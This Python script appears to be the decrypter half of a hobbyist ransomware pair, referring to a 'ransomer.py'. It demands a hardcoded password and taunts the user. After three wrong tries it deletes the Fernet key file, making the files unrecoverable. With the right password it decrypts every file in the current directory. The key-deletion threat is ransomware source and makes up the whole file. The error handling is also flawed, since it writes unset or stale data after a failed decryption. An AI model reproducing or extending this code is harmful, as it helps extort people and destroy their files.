#!/usr/bin/env python3

# let's find some files
# aetherWasHere

# things to do 3 chances then key is deleted.
# put things into functions and add '__name__ == "__main__"'
# add funcs. to ransomer.py
# handle if the user uses ctrl + c

import os
import sys
from cryptography.fernet import Fernet, InvalidToken

def deleteTheKey():
	nameOfKey = "theKey.key"
	keyExists = False
	for file in os.listdir():
		if file == nameOfKey:
			keyExists = True
	if not keyExists:
		print("\nUhh. the key is gone..and it wasn't me\n")
		print("\nwhoopsie daisy :)\n")
		sys.exit()
	else:
		os.remove(nameOfKey)

def main():
	pWord = "coffeeisgreat"
	files = []
	iteral = 0
	for file in os.listdir():
		if file == "ransomer.py" or file == "theKey.key" or file == "decrypter.py":
			continue
		if os.path.isfile(file):
			files.append(file)

	print(files)

	print("\nIf you want your files, you need a password\nCareful! After 3 tries, the key will disappear and with it any chance of getting\nYour stuff back :)\n")
	while True:
		try:
			iteral += 1
			userPWord = input("\nPassword: ")

			if userPWord != pWord:
				print("\nWrong!\n")
			if userPWord == pWord:
				break

			if iteral == 3:
				print("\nOooooh, thats three..\n")
				deleteTheKey()
				print("\nthe key went on vacay, byeee.\n")
				sys.exit()
			elif iteral == 2:
				print("\nOnE mOrE tRyyeyeyy.\n")
			elif iteral == 1:
				print("\nSTRRRRIKE ONE\n")
		except KeyboardInterrupt:
			sys.exit()

	print("\ndarn, your right\n")

	# Start the decryption.
	try:
		with open("theKey.key", "rb") as thekey:
			secretkey = thekey.read().rstrip()
	except FileNotFoundError:
		print("hey, u know. this is my fault.\nbut the key is gone.\nOk, bye! <3")
		sys.exit()

	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		try:
			contents_decrypted = Fernet(secretkey).decrypt(contents)
		except InvalidToken:
			# Don't print error is InvalidToken Found.
			pass
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)

	print("\nOk, you're files are back.\nBye!!!\n")

if __name__ == "__main__":
	print("\nWELCOME TO THE DECRYPTER!!!\nPlease! Make yourself at Home!\nthis could take a while...\n")
	try:
		main()
	except KeyboardInterrupt:
		pass
	except InvalidToken:
		pass
	except FileNotFoundError:
		pass
